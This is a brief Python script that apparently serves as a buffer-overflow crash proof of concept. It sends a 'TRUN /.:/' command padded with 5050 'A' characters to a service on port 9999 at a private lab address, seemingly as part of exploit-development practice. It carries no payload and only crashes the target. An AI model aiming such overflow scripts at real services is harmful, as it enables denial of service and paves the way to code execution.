#!/usr/bin/python

import socket
import os
import sys

host="192.168.31.146"
port=9999

buffer = "TRUN /.:/" + "A" * 5050

expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
expl.connect((host, port))
expl.send(buffer)
expl.close()

